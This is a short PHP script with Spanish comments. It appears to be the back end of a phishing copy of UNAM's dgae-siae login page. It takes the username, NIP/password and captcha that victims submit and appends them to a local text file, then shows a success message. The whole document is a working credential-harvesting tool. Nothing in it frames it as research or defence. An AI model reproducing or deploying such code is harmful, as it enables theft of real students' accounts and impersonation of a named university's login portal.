<?php
// Recoge los datos enviados por el formulario
$usuario = $_POST['usr_logi'];
$nip = $_POST['usr_pass'];
$captcha = $_POST['captcha'];

// Define la ruta del archivo txt donde se guardarán los datos
$file = 'C:\Users\Apollo\Downloads\www.dgae-siae.unam.mx-1724457415';

// Formato de los datos a guardar
$contenido = "Usuario: $usuario, NIP: $nip, Captcha: $captcha\n";

// Escribe los datos en el archivo
file_put_contents($file, $contenido, FILE_APPEND);

// Redirecciona de vuelta a la página o muestra un mensaje de éxito
echo "Datos guardados correctamente.";
?>
